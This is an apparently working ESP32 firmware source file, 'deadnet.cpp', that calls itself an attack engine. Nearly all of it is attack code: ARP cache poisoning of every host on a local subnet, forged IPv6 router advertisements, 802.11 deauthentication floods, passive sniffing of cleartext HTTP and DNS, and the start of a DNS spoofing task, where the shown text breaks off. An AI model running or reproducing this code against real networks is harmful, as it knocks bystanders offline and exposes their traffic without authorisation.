/**
 * deadnet.cpp – ESP32 ARP-Poison / RA-Spoof attack engine
 *
 * How it works:
 *  1. On startAttack() we resolve the gateway IP (from DHCP) and its MAC
 *     (via a gratuitous ARP request).
 *  2. We enumerate the /24 subnet and send an ARP-request to each .1-.254
 *     host to learn which are alive and what their MACs are.
 *  3. For every known host we send two ARP REPLY packets every cycle:
 *       a. To the HOST  → "I am the gateway" (spoofed sender MAC)
 *       b. To the GW   → "I am <host>"       (spoofed sender MAC)
 *     This poisons both ARP caches so the host loses Internet access.
 *  4. We also periodically re-scan to pick up new hosts.
 *
 * Packet injection on ESP32 STA:
 *  esp_wifi_80211_tx() in STA mode sends a raw 802.11 data frame
 *  "To DS" (BSSID in Addr1, our MAC in Addr2, destination in Addr3).
 *  The AP handles forwarding.  This is reliable when the radio is in the
 *  normal (non-promiscuous) STA mode as long as we form the headers right.
 */

#include "deadnet.h"
#include "logger.h"
#include <WiFiUdp.h>

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <lwip/inet.h>
#include <lwip/etharp.h>
#include <lwip/netif.h>
#include <string.h>
#include <stdlib.h>

extern "C" {
    esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void *buffer, uint16_t len);
}

// ─── constants ───────────────────────────────────────────────────────────────
static const uint8_t kBroadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static const uint8_t kZeroMac[6]      = {0x00,0x00,0x00,0x00,0x00,0x00};

// How long to wait for an ARP reply when scanning (ms)
#define ARP_SCAN_TIMEOUT_MS   80
// Cycle delay between full poison sweeps (ms)
#define POISON_CYCLE_DELAY_MS 200
// Max hosts we track
#define MAX_HOSTS 64

// ─── helper: build & inject an 802.11 Data "To DS" frame carrying an
//             Ethernet II / ARP payload ───────────────────────────────────────
//
// Frame layout (To DS, no QoS):
//   [FC 2][DUR 2][ADDR1=BSSID 6][ADDR2=SRC 6][ADDR3=DST 6][SEQ 2]
//   [LLC/SNAP 8][ARP 28]
//   total = 60 bytes
//
bool Deadnet::sendArpPacket(
        IPAddress srcIp,   const uint8_t* srcMac,   // who we pretend to be
        IPAddress dstIp,   const uint8_t* dstMac,   // ethernet destination
        IPAddress senderIp,const uint8_t* senderMac, // ARP sender fields
        IPAddress targetIp,const uint8_t* targetMac, // ARP target fields
        uint16_t  opcode)
{
    uint8_t pkt[128];
    int     len = 0;

    // ── 802.3 Ethernet Header (14 bytes) ─────────────────────────────────
    memcpy(&pkt[len], dstMac, 6); len += 6;
    memcpy(&pkt[len], srcMac, 6); len += 6; // usually _myMac so AP doesn't drop it
    pkt[len++] = 0x08; pkt[len++] = 0x06;   // EtherType: ARP

    // ── ARP payload (28 bytes) ───────────────────────────────────────────
    pkt[len++] = 0x00; pkt[len++] = 0x01; // HTYPE = Ethernet
    pkt[len++] = 0x08; pkt[len++] = 0x00; // PTYPE = IPv4
    pkt[len++] = 0x06;                    // HLEN  = 6
    pkt[len++] = 0x04;                    // PLEN  = 4
    pkt[len++] = (opcode >> 8) & 0xFF;
    pkt[len++] =  opcode       & 0xFF;    // OPER

    // Sender hardware / protocol address (who we pretend to be)
    memcpy(&pkt[len], senderMac, 6); len += 6;
    pkt[len++] = senderIp[0]; pkt[len++] = senderIp[1];
    pkt[len++] = senderIp[2]; pkt[len++] = senderIp[3];

    // Target hardware / protocol address
    memcpy(&pkt[len], targetMac, 6); len += 6;
    pkt[len++] = targetIp[0]; pkt[len++] = targetIp[1];
    pkt[len++] = targetIp[2]; pkt[len++] = targetIp[3];

    // Inject using internal tx (handles encryption natively if WPA2)
    esp_err_t err = esp_wifi_internal_tx(WIFI_IF_STA, pkt, len);

    if (err == ESP_OK) {
        _pktCount++;
        return true;
    } else {
        static uint32_t lastErrLog = 0;
        if (millis() - lastErrLog > 5000) {
            Logger::log("Injection failed (0x" + String(err, HEX) + ")", "error");
            lastErrLog = millis();
        }
    }
    return false;
}

// ─── Passive Sniffer Callback ──────────────────────────────────────────────
// This lets us find hosts by just listening to traffic on the current channel.
static Deadnet* g_instance = nullptr;

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_instance || !g_instance->isRunning()) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (type == WIFI_PKT_DATA) {
        // Check if it's an 802.11 Data frame (type 0x08)
        if ((payload[0] & 0x0C) != 0x08) return;

        // Skip MAC header
        int offset = 24; 
        if (len < offset + 8) return; 

        if (payload[offset] == 0xAA && payload[offset+1] == 0xAA) {
            uint16_t ethType = (payload[offset+6] << 8) | payload[offset+7];
            
            // ARP Discovery
            if (ethType == 0x0806 && len >= offset + 8 + 28) {
                uint8_t* arp = &payload[offset+8];
                IPAddress srcIp(arp[14], arp[15], arp[16], arp[17]);
                g_instance->addHost(srcIp, &arp[8]);
            }
            // IPv4 Analysis
            else if (ethType == 0x0800 && len >= offset + 8 + 20) {
                uint8_t* ip = &payload[offset+8];
                IPAddress srcIp(ip[12], ip[13], ip[14], ip[15]);
                g_instance->addHost(srcIp, &payload[10]);

                // SNIFFING LOGIC: If Sniffing is enabled, look for cleartext
                if (g_instance->getMode() & ATTACK_MODE_SNIFF) {
                    uint8_t protocol = ip[9];
                    int ipHeaderLen = (ip[0] & 0x0F) * 4;
                    uint8_t* transport = &ip[ipHeaderLen];
                    
                    // HTTP (TCP Port 80)
                    if (protocol == 6) { // TCP
                        uint16_t srcPort = (transport[0] << 8) | transport[1];
                        uint16_t dstPort = (transport[2] << 8) | transport[3];
                        if (srcPort == 80 || dstPort == 80) {
                            uint8_t* http = &transport[20]; // Assuming no TCP options
                            int httpLen = len - (offset + 8 + ipHeaderLen + 20);
                            if (httpLen > 5) {
                                char firstLine[128];
                                int copyLen = (httpLen > 127) ? 127 : httpLen;
                                memcpy(firstLine, http, copyLen);
                                firstLine[copyLen] = '\0';
                                
                                char* get = strstr(firstLine, "GET ");
                                char* post = strstr(firstLine, "POST ");
                                char* host = strstr(firstLine, "Host: ");
                                
                                if (get || post || host) {
                                    String content = "";
                                    if (get) {
                                        char* end = strstr(get, "\r\n");
                                        if (end) *end = '\0';
                                        content = String(get);
                                    } else if (post) {
                                        char* end = strstr(post, "\r\n");
                                        if (end) *end = '\0';
                                        content = String(post);
                                    }
                                    
                                    if (host) {
                                        char* end = strstr(host, "\r\n");
                                        if (end) *end = '\0';
                                        if (content.length() > 0) content += " | ";
                                        content += String(host);
                                    }

                                    if (content.length() > 0) {
                                        g_instance->addSniffLog(srcIp.toString(), "HTTP", content);
                                    }
                                }
                            }
                        }
                    }
                    // DNS (UDP Port 53)
                    else if (protocol == 17) { // UDP
                        uint16_t srcPort = (transport[0] << 8) | transport[1];
                        uint16_t dstPort = (transport[2] << 8) | transport[3];
                        if (srcPort == 53 || dstPort == 53) {
                            // DNS logic here could extract domain names
                            g_instance->addSniffLog(srcIp.toString(), "DNS Query", "Activity detected");
                        }
                    }
                }
            }
        }
    }
}

// ─── constructor / begin ──────────────────────────────────────────────────────
Deadnet::Deadnet() {
    memset(_gatewayMac, 0, 6);
    memset(_myMac,      0, 6);
    memset(_bssid,      0, 6);
    g_instance = this;
}

void Deadnet::begin() {
    _hostsMutex = xSemaphoreCreateMutex();
    esp_wifi_get_mac(WIFI_IF_STA, _myMac);
    esp_wifi_set_promiscuous_rx_cb(sniffer_callback);
}

// ─── helpers ─────────────────────────────────────────────────────────────────
void Deadnet::generateRandomMac(uint8_t* out) {
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)esp_random();
    out[0] &= 0xFE; // unicast
    out[0] |= 0x02; // locally administered
}

bool Deadnet::parseMac(const String& s, uint8_t* out) {
    int v[6];
    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
               &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
    return true;
}

bool Deadnet::isZeroMac(const uint8_t* m) const {
    for (int i = 0; i < 6; i++) if (m[i]) return false;
    return true;
}

String Deadnet::getGatewayMacStr() const {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             _gatewayMac[0],_gatewayMac[1],_gatewayMac[2],
             _gatewayMac[3],_gatewayMac[4],_gatewayMac[5]);
    return String(buf);
}

// ─── host list (thread-safe) ──────────────────────────────────────────────────
void Deadnet::addHost(IPAddress ip, const uint8_t* mac, uint16_t pingMs) {
    if (!_hostsMutex) return;
    if (xSemaphoreTake(_hostsMutex, pdMS_TO_TICKS(50)) != pdTRUE) return;

    // Don't add gateway or our own IP
    if (ip == _gatewayIp || ip == WiFi.localIP()) {
        xSemaphoreGive(_hostsMutex);
        return;
    }

    Host* targetHost = nullptr;
    for (auto& h : _hosts) {
        if (h.ip == ip) {
            targetHost = &h;
            break;
        }
    }

    if (!targetHost && _hosts.size() < MAX_HOSTS) {
        Host h;
        h.ip = ip;
        h.pingMs = pingMs;
        h.macKnown = false;
        h.hostname = "";
        _hosts.push_back(h);
        targetHost = &_hosts.back();
        Logger::log("Host discovered: " + ip.toString());
    }

    if (targetHost) {
        if (mac && !targetHost->macKnown) {
            memcpy(targetHost->mac, mac, 6); 
            targetHost->macKnown = true;
            if (pingMs > 0 && targetHost->pingMs == 0) targetHost->pingMs = pingMs;
        }
        
        // Grab current hostname and release mutex
        String currentHostname = targetHost->hostname;
        xSemaphoreGive(_hostsMutex);

        if (currentHostname.isEmpty()) {
            String newHostname = resolveHostname(ip);
            if (!newHostname.isEmpty()) {
                if (xSemaphoreTake(_hostsMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
                    for (auto& h : _hosts) {
                        if (h.ip == ip) {
                            h.hostname = newHostname;
                            break;
                        }
                    }
                    xSemaphoreGive(_hostsMutex);
                }
            }
        }
        return;
    }

    xSemaphoreGive(_hostsMutex);
}

std::vector<Host> Deadnet::getHosts() {
    std::vector<Host> copy;
    if (_hostsMutex && xSemaphoreTake(_hostsMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        copy = _hosts;
        xSemaphoreGive(_hostsMutex);
    }
    return copy;
}

void Deadnet::clearHosts() {
    if (_hostsMutex && xSemaphoreTake(_hostsMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        _hosts.clear();
        xSemaphoreGive(_hostsMutex);
        Logger::log("Discovered hosts cleared.");
    }
}

// Bug-hunt #1 fix: sniffer_callback runs on the WiFi task and calls
// addSniffLog which writes _sniffLogs; /api/dead/sniff reads it from the
// main task via getSniffedData; original code had NO mutex, so a
// concurrent push_back + copy could reallocate mid-iteration and crash.
// Added a dedicated mutex around every _sniffLogs touch.
static std::vector<Deadnet::SniffedData> _sniffLogs;
static SemaphoreHandle_t _sniffMutex = nullptr;

static void ensureSniffMutex() {
    if (!_sniffMutex) _sniffMutex = xSemaphoreCreateMutex();
}

std::vector<Deadnet::SniffedData> Deadnet::getSniffedData() {
    std::vector<Deadnet::SniffedData> copy;
    ensureSniffMutex();
    if (_sniffMutex && xSemaphoreTake(_sniffMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
        copy = _sniffLogs;
        xSemaphoreGive(_sniffMutex);
    }
    return copy;
}

void Deadnet::addSniffLog(String src, String type, String content) {
    SniffedData d;
    d.source = src;
    d.type = type;
    d.content = content;
    d.timestamp = millis();
    ensureSniffMutex();
    if (_sniffMutex && xSemaphoreTake(_sniffMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
        _sniffLogs.push_back(d);
        if (_sniffLogs.size() > 50) _sniffLogs.erase(_sniffLogs.begin());
        xSemaphoreGive(_sniffMutex);
    }
}

void Deadnet::clearSniffLogs() {
    ensureSniffMutex();
    if (_sniffMutex && xSemaphoreTake(_sniffMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
        _sniffLogs.clear();
        xSemaphoreGive(_sniffMutex);
    }
}

// ─── resolve gateway / BSSID ────────────────────────────────────────────────
void Deadnet::resolveNetworkParams() {
    // STA MAC
    esp_wifi_get_mac(WIFI_IF_STA, _myMac);

    // Gateway IP (from DHCP)
    _gatewayIp = WiFi.gatewayIP();

    // BSSID (the AP we're connected to)
    uint8_t* bssid = WiFi.BSSID();
    if (bssid) memcpy(_bssid, bssid, 6);

    Logger::log("My MAC   : " + WiFi.macAddress());
    Logger::log("Gateway  : " + _gatewayIp.toString());
    Logger::log("BSSID    : " + WiFi.BSSIDstr());
    Logger::log("My IP    : " + WiFi.localIP().toString());
    Logger::log("Subnet   : " + WiFi.subnetMask().toString());

    // Resolve gateway MAC via ARP request (broadcast)
    // We send an ARP WHO-HAS for the gateway
    // Then we sniff (passively) for the reply via the promiscuous RX callback
    // For simplicity: use the BSSID as a fallback (works when AP == router)
    if (isZeroMac(_gatewayMac)) {
        memcpy(_gatewayMac, _bssid, 6);
        Logger::log("Gateway MAC (BSSID): " + getGatewayMacStr());
    }
}

// ─── subnet ARP scan ─────────────────────────────────────────────────────────
// Sends ARP WHO-HAS to every address in the /24 subnet.
// We don't wait for replies here – replies come back through the normal
// WiFi stack and we learn MACs passively.  For the attack we don't actually
// need the MAC of each host (we broadcast the poison), but having them
// lets us do targeted poisons which are far more reliable.
void Deadnet::scanSubnetArp() {
    if (WiFi.status() != WL_CONNECTED) return;

    IPAddress local   = WiFi.localIP();
    IPAddress gateway = WiFi.gatewayIP();

    uint8_t base[4];
    base[0] = local[0]; base[1] = local[1]; base[2] = local[2]; base[3] = 0;

    Logger::log("Scanning subnet " + String(base[0]) + "." + String(base[1]) +
                "." + String(base[2]) + ".0/24 ...");

    uint8_t myMacLocal[6];
    esp_wifi_get_mac(WIFI_IF_STA, myMacLocal);

    uint32_t scanStartMs = millis();
    for (int i = 1; i < 255 && _running; i++) {
        IPAddress target(base[0], base[1], base[2], i);
        if (target == local || target == gateway) continue;

        // ARP REQUEST (op=1): "Who has <target>? Tell <me>"
        sendArpPacket(
            local,     myMacLocal,        // src (ethernet level, unused for ARP REQUEST)
            IPAddress(255,255,255,255), kBroadcastMac, // dst = broadcast
            local,     myMacLocal,        // ARP sender = us
            target,    kZeroMac,          // ARP target = unknown
            1                             // opcode = REQUEST
        );
        vTaskDelay(pdMS_TO_TICKS(30)); // 30ms delay prevents AP broadcast queue drops

        // Poll LWIP ARP table for the decrypted reply
        ip4_addr_t *ipaddr;
        struct netif *n;
        struct eth_addr *eth_ret;
        for (int j = 0; j < ARP_TABLE_SIZE; j++) {
            if (etharp_get_entry(j, &ipaddr, &n, &eth_ret)) {
                if (ipaddr != nullptr) {
                    IPAddress ip(ipaddr->addr);
                    // Filter: only add hosts from our target subnet
                    if (ip[0] == base[0] && ip[1] == base[1] && ip[2] == base[2]) {
                        uint16_t pingMs = (uint16_t)(millis() - scanStartMs);
                        addHost(ip, eth_ret->addr, pingMs);
                    }
                }
            }
        }
    }
    
    // Final polling loop for late replies (Ethernet bridged devices, DTIM power-save)
    Logger::log("Waiting for late replies...");
    for (int poll = 0; poll < 100 && _running; poll++) {
        vTaskDelay(pdMS_TO_TICKS(20)); // wait 2 seconds total
        ip4_addr_t *ipaddr;
        struct netif *n;
        struct eth_addr *eth_ret;
        for (int j = 0; j < ARP_TABLE_SIZE; j++) {
            if (etharp_get_entry(j, &ipaddr, &n, &eth_ret)) {
                if (ipaddr != nullptr) {
                    IPAddress ip(ipaddr->addr);
                    if (ip[0] == base[0] && ip[1] == base[1] && ip[2] == base[2]) {
                        uint16_t pingMs = (uint16_t)(millis() - scanStartMs);
                        addHost(ip, eth_ret->addr, pingMs);
                    }
                }
            }
        }
    }
    Logger::log("Subnet scan complete.");
}

// ─── poison a single host ────────────────────────────────────────────────────
void Deadnet::poisonSingleHost(const Host& host) {
    uint8_t spoofMac[6];
    generateRandomMac(spoofMac);

    IPAddress myIp   = WiFi.localIP();
    uint8_t myMacLocal[6];
    esp_wifi_get_mac(WIFI_IF_STA, myMacLocal);

    // ── Poison HOST: tell it "Gateway is at <spoofMac>" ──────────────────
    // ARP REPLY to the host
    // Ethernet dst = host MAC (if known) or broadcast
    const uint8_t* dstMac = host.macKnown ? host.mac : kBroadcastMac;

    sendArpPacket(
        myIp, myMacLocal,        // ethernet src (our real MAC - AP filters by this)
        host.ip, dstMac,         // ethernet dst = the host
        _gatewayIp, spoofMac,    // ARP sender = gateway IP but random MAC
        host.ip,   dstMac,       // ARP target = the host
        2                        // opcode = REPLY
    );

    // ── Poison GATEWAY: tell it "<host> is at <spoofMac>" ────────────────
    generateRandomMac(spoofMac); // new random MAC each direction
    sendArpPacket(
        myIp, myMacLocal,
        _gatewayIp, _gatewayMac,  // send to gateway
        host.ip,   spoofMac,      // ARP sender = host IP but random MAC
        _gatewayIp, _gatewayMac,  // ARP target = gateway
        2
    );
}

void Deadnet::poisonAllHosts() {
    if (_mode & ATTACK_MODE_BLIND) {
        IPAddress local = WiFi.localIP();
        IPAddress gateway = WiFi.gatewayIP();
        uint8_t base[4];
        base[0] = local[0]; base[1] = local[1]; base[2] = local[2]; base[3] = 0;
        
        for (int i = 1; i < 255 && _running; i++) {
            IPAddress target(base[0], base[1], base[2], i);
            if (target == local || target == gateway) continue;
            Host h;
            h.ip = target;
            h.macKnown = false;
            poisonSingleHost(h);
            vTaskDelay(pdMS_TO_TICKS(5)); 
        }
        return;
    }

    auto hosts = getHosts();
    if (hosts.empty() && _targets.empty()) {
        // No hosts learned and no specific targets - send broadcast poison
        uint8_t spoofMac[6];
        generateRandomMac(spoofMac);
        IPAddress myIp = WiFi.localIP();
        uint8_t myMacLocal[6];
        esp_wifi_get_mac(WIFI_IF_STA, myMacLocal);

        sendArpPacket(
            myIp, myMacLocal,
            IPAddress(255,255,255,255), kBroadcastMac,
            _gatewayIp, spoofMac,
            IPAddress(0,0,0,0), kBroadcastMac,
            2
        );
        return;
    }

    if (_targets.empty()) {
        for (const auto& h : hosts) {
            if (!_running) break;
            poisonSingleHost(h);
            vTaskDelay(pdMS_TO_TICKS(5));
        }
    } else {
        for (const auto& targetIp : _targets) {
            for (const auto& h : hosts) {
                if (h.ip == targetIp) {
                    poisonSingleHost(h);
                    vTaskDelay(pdMS_TO_TICKS(5));
                }
            }
        }
    }
}

// Helper for ICMPv6 checksum (includes pseudo-header)
static uint16_t icmpv6_checksum(uint8_t* ip6, uint8_t* icmp, uint16_t icmpLen) {
    uint32_t sum = 0;
    // Pseudo-header: Source (16), Dest (16), Length (4), Zeroes (3), NextHeader (1)
    for (int i = 0; i < 16; i += 2) sum += (ip6[i] << 8) | ip6[i+1];
    for (int i = 16; i < 32; i += 2) sum += (ip6[i] << 8) | ip6[i+1];
    sum += icmpLen;
    sum += 58; // Next Header: ICMPv6
    
    // ICMPv6 body
    for (int i = 0; i < (icmpLen & ~1); i += 2) sum += (icmp[i] << 8) | icmp[i+1];
    if (icmpLen & 1) sum += (icmp[icmpLen - 1] << 8);

    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~((uint16_t)sum);
}

// ─── RA spoof (IPv6) ─────────────────────────────────────────────────────────
// Sends a Neighbor Discovery Router Advertisement with Router Lifetime = 0.
// This tells IPv6 clients that this router is NOT a default gateway.
void Deadnet::sendRaSpoof() {
    uint8_t pkt[350];
    int     len = 0;
    uint8_t randMac[6];
    generateRandomMac(randMac);

    // Derived Gateway IPv6 (Link-Local)
    uint8_t gwIpv6[16] = {0xfe, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0};
    gwIpv6[8]  = _gatewayMac[0] ^ 2;
    gwIpv6[9]  = _gatewayMac[1];
    gwIpv6[10] = _gatewayMac[2];
    gwIpv6[11] = 0xff;
    gwIpv6[12] = 0xfe;
    gwIpv6[13] = _gatewayMac[3];
    gwIpv6[14] = _gatewayMac[4];
    gwIpv6[15] = _gatewayMac[5];

    uint8_t allNodesIpv6[16] = {0xff, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
    uint8_t mcMac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};

    // Ethernet Header: Use Random MAC as source
    memcpy(&pkt[len], mcMac, 6); len += 6;
    memcpy(&pkt[len], randMac, 6); len += 6;
    pkt[len++] = 0x86; pkt[len++] = 0xDD;

    // IPv6 Header
    int ipStart = len;
    pkt[len++] = 0x60; pkt[len++] = 0x00; pkt[len++] = 0x00; pkt[len++] = 0x00;
    int payloadLenIdx = len;
    pkt[len++] = 0x00; pkt[len++] = 0x00;
    pkt[len++] = 58; pkt[len++] = 255;
    memcpy(&pkt[len], gwIpv6, 16); len += 16;
    memcpy(&pkt[len], allNodesIpv6, 16); len += 16;

    // ICMPv6 RA
    int icmpStart = len;
    pkt[len++] = 134; pkt[len++] = 0;
    int checksumIdx = len;
    pkt[len++] = 0x00; pkt[len++] = 0x00;
    pkt[len++] = 255; // Cur Hop Limit
    pkt[len++] = 0x00; // Flags
    pkt[len++] = 0x00; pkt[len++] = 0x00; // Router Lifetime: 0
    pkt[len++] = 0x00; pkt[len++] = 0x00; pkt[len++] = 0x00; pkt[len++] = 0x00; // Reachable time
    pkt[len++] = 0x00; pkt[len++] = 0x00; pkt[len++] = 0x00; pkt[len++] = 0x00; // Retrans timer

    // Option: Source Link-Layer Address
    pkt[len++] = 1; pkt[len++] = 1;
    memcpy(&pkt[len], randMac, 6); len += 6;

    // Option: MTU
    pkt[len++] = 5; pkt[len++] = 1;
    pkt[len++] = 0; pkt[len++] = 0;
    pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0x00; pkt[len++] = 0x80; // MTU 128 (too small to use)

    // Option: Prefix Info
    pkt[len++] = 3; pkt[len++] = 4;
    pkt[len++] = 64; // Prefix Length
    pkt[len++] = 0x00; // L + A bits (None)
    pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; // Valid Lifetime: 0
    pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; // Preferred Lifetime: 0
    pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; // Reserved
    memcpy(&pkt[len], gwIpv6, 16); // Source prefix
    memset(&pkt[len+8], 0, 8);
    len += 16;

    // Option: RDNSS (Recursive DNS Server)
    pkt[len++] = 25; pkt[len++] = 3; // Type 25, Length 3 (24 bytes)
    pkt[len++] = 0; pkt[len++] = 0;
    pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; // Lifetime 0
    // Fake DNS (Link-local dead address)
    uint8_t deadDns[16] = {0xfe, 0x80, 0,0,0,0,0,0,0,0,0,0,0,0,0,0x66};
    memcpy(&pkt[len], deadDns, 16); len += 16;

    // Finalize
    uint16_t icmpLen = len - icmpStart;
    pkt[payloadLenIdx] = (icmpLen >> 8) & 0xFF;
    pkt[payloadLenIdx+1] = icmpLen & 0xFF;
    
    uint16_t cksum = icmpv6_checksum(&pkt[ipStart + 8], &pkt[icmpStart], icmpLen);
    pkt[checksumIdx] = (cksum >> 8) & 0xFF;
    pkt[checksumIdx+1] = cksum & 0xFF;

    esp_wifi_internal_tx(WIFI_IF_STA, pkt, len);
    _pktCount++;
}

// ─── Deauth Attack ──────────────────────────────────────────────────────────
void Deadnet::sendDeauth(const uint8_t* targetMac) {
    uint8_t pkt[26];
    int len = 0;

    // 802.11 Deauth frame
    pkt[len++] = 0xC0; // Type: Management, Subtype: Deauthentication
    pkt[len++] = 0x00; // Flags
    pkt[len++] = 0x00; pkt[len++] = 0x00; // Duration
    memcpy(&pkt[len], targetMac, 6); len += 6; // Addr1: Destination
    memcpy(&pkt[len], _bssid, 6);    len += 6; // Addr2: Source (AP BSSID)
    memcpy(&pkt[len], _bssid, 6);    len += 6; // Addr3: BSSID
    pkt[len++] = 0x00; pkt[len++] = 0x00; // Seq
    pkt[len++] = 0x07; pkt[len++] = 0x00; // Reason: Class 3 frame received from nonassociated STA

    uint8_t* dmaPkt = (uint8_t*)heap_caps_malloc(len, MALLOC_CAP_DMA | MALLOC_CAP_8BIT);
    if (dmaPkt) {
        memcpy(dmaPkt, pkt, len);
        // Management frames also sent via WIFI_IF_AP for stability
        esp_wifi_80211_tx(WIFI_IF_AP, dmaPkt, len, true);
        heap_caps_free(dmaPkt);
    }
}

// ─── FreeRTOS tasks ──────────────────────────────────────────────────────────
void Deadnet::subnetScanTask(void* pv) {
    Deadnet* self = static_cast<Deadnet*>(pv);
    // Initial scan
    self->scanSubnetArp();
    // Re-scan every 30 s to discover new hosts
    while (self->_running) {
        vTaskDelay(pdMS_TO_TICKS(30000));
        if (self->_running) self->scanSubnetArp();
    }
    self->_scanTaskHandle = nullptr;
    vTaskDelete(NULL);
}

void Deadnet::attackTask(void* pv) {
    Deadnet* self = static_cast<Deadnet*>(pv);
    Logger::log("Attack task started.");

    while (self->_running) {
        if (WiFi.status() != WL_CONNECTED) {
            Logger::log("WiFi disconnected – pausing attack.", "warning");
            vTaskDelay(pdMS_TO_TICKS(2000));
            continue;
        }

        // ARP Poisoning
        if (self->_mode & ATTACK_MODE_ARP) {
            self->poisonAllHosts();
        }

        // IPv6 RA Spoofing
        if (self->_mode & ATTACK_MODE_RA) {
            self->sendRaSpoof();
        }

        // Deauth Attack
        if (self->_mode & ATTACK_MODE_DEAUTH) {
            auto hosts = self->getHosts();
            if (self->_targets.empty()) {
                if (hosts.empty()) {
                    self->sendDeauth(kBroadcastMac);
                } else {
                    for (const auto& h : hosts) {
                        if (!self->_running) break;
                        self->sendDeauth(h.mac);
                    }
                }
            } else {
                for (const auto& targetIp : self->_targets) {
                    for (const auto& h : hosts) {
                        if (h.ip == targetIp) self->sendDeauth(h.mac);
                    }
                }
            }
        }

        self->_cycleCount++;
        if (self->_cycleCount % 10 == 0) {
            Logger::log("Attack cycle #" + String(self->_cycleCount) +
                        " | pkts=" + String(self->_pktCount) +
                        " | hosts=" + String(self->getHosts().size()));
        }

        vTaskDelay(pdMS_TO_TICKS(POISON_CYCLE_DELAY_MS));
    }

    Logger::log("Attack task stopped.");
    self->_attackTaskHandle = nullptr;
    vTaskDelete(NULL);
}

// ─── resolve hostname (DNS PTR) ─────────────────────────────────────────────
String Deadnet::resolveHostname(IPAddress target) {
    if (target == _gatewayIp || target == WiFi.localIP()) return "";

    WiFiUDP udp;
    if (!udp.begin(10000 + (esp_random() % 10000))) return "";

    uint8_t pkt[128];
    memset(pkt, 0, sizeof(pkt));
    
    // DNS Header
    uint16_t id = esp_random() & 0xFFFF;
    pkt[0] = id >> 8; pkt[1] = id & 0xFF;
    pkt[2] = 0x01; pkt[3] = 0x00; // Standard query
    pkt[4] = 0x00; pkt[5] = 0x01; // 1 Question
    
    int len = 12;
    char ipStr[32];
    snprintf(ipStr, sizeof(ipStr), "%d.%d.%d.%d.in-addr.arpa", target[3], target[2], target[1], target[0]);
    
    char* token = strtok(ipStr, ".");
    while (token) {
        uint8_t tlen = strlen(token);
        pkt[len++] = tlen;
        memcpy(&pkt[len], token, tlen);
        len += tlen;
        token = strtok(NULL, ".");
    }
    pkt[len++] = 0;
    
    pkt[len++] = 0x00; pkt[len++] = 12; // Type PTR
    pkt[len++] = 0x00; pkt[len++] = 1;  // Class IN

    udp.beginPacket(_gatewayIp, 53);
    udp.write(pkt, len);
    udp.endPacket();

    uint32_t start = millis();
    while (millis() - start < 150) {
        if (udp.parsePacket() > 0) {
            uint8_t resp[256];
            int rlen = udp.read(resp, sizeof(resp));
            if (rlen > 12 && resp[0] == pkt[0] && resp[1] == pkt[1]) {
                int ancount = (resp[6] << 8) | resp[7];
                if (ancount > 0) {
                    int ptr = 12;
                    while(ptr < rlen && resp[ptr] != 0) ptr++;
                    ptr += 5; // skip 0 and Type/Class
                    
                    if (ptr + 12 < rlen) {
                        ptr += 2; // skip name pointer
                        ptr += 10; // skip type, class, ttl, rdlength
                        
                        String name = "";
                        int jumps = 0;
                        while(ptr < rlen && jumps < 5) {
                            uint8_t l = resp[ptr++];
                            if (l == 0) break;
                            if ((l & 0xC0) == 0xC0) {
                                if (ptr >= rlen) break;
                                ptr = ((l & 0x3F) << 8) | resp[ptr];
                                jumps++;
                            } else {
                                for (int i=0; i<l && ptr<rlen; i++) name += (char)resp[ptr++];
                                name += ".";
                            }
                        }
                        if (name.endsWith(".")) name.remove(name.length()-1);
                        if (name.endsWith(".fritz.box")) name.replace(".fritz.box", "");
                        if (name.endsWith(".local")) name.replace(".local", "");
                        return name;
                    }
                }
            }
        }
        vTaskDelay(1);
    }
    return "";
}

void Deadnet::dnsSpoofTask(void* pv) {
    Deadnet* self = static_cast<Deadnet*>(pv);
    WiFiUDP udp;
    if (!udp.begin(53)) {
        Logger::log("Failed to start DNS spoof listener on port 53", "error");
        self->_dnsTaskHandle = nullptr;
        vTaskDelete(NULL);
        return;
    }

    Logger::log("DNS spoofing task started.");
    uint8_t buf[512];

    while (self->_running) {
        if ((self->_mode & ATTACK_MODE_DNS) == 0) {
            vTaskDelay(pdMS_TO_TICKS(500));
            continue;
        }

        int packetSize = udp.parsePacket();
        // Bug-hunt round 4: cap the readable size so the response
        // construction below (appends 16 bytes for the fake A record)
        // can't overflow buf[512]. A 500-byte DNS query + 16 append =
        // 516 out of 512.
        if (packetSize > 0 && packetSize <= (int)sizeof(buf) - 16) {
            int len = udp.read(buf, sizeof(buf));
            
            // Basic DNS query check (at least 12 bytes header)
            // byte 2: Flags (must be query 0x0100 or 0x0000)
            if (len >= 12 && (buf[2] & 0x80) == 0) { 
                // Extract query name for sniffing
                String domain = "";
                int pos = 12;
                while (pos < len && buf[pos] != 0) {
                    int l = buf[pos];
